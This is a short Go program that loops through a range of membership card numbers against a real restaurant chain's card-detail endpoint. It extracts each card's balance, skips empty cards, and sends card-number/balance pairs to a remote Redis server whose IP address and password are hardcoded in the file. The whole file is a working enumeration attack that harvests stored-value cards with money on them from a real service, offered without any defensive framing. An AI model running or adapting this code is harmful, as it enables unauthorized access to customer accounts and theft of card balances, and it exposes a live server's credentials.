package main

import (
	"fmt"
	"github.com/go-redis/redis"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
)

var hdlList []string

func main() {

	rd := redisUtils()

	for i := 1000; i <= 9999; i++ {
		resp, _ := http.Get("http://card.haidilao.net/TzxMember/tzx/getCardDetailInfo?hykid=NC2019021" + strconv.Itoa(i))
		defer resp.Body.Close()
		bodyText, _ := ioutil.ReadAll(resp.Body)
		text := string(bodyText)
		if strings.Contains(text, "HTTP Status 500") {
			continue
		}
		// 余额
		lpos := strings.Index(text, "knye")
		rpos := strings.Index(text, "kzbh")
		myPrice := text[lpos+6 : rpos-2]
		if myPrice == "0.0" {
			continue
		}
		t := "NC2019021" + strconv.Itoa(i) + "-" + myPrice
		rd.SAdd("hdlCard", t)
		hdlList = append(hdlList, t)
		log.Println(i)
	}

	fmt.Println("扫描完成")

	fileName := "./NC2019021.txt"
	dfsFile, _ := os.Create(fileName)
	defer dfsFile.Close()

	for _, item := range hdlList {
		dfsFile.WriteString(item + "\n")
	}
}

func redisUtils() *redis.Client {
	rdb := redis.NewClient(&redis.Options{Addr: "175.27.243.243:6379", Password: "213879", DB: 0})
	return rdb
}
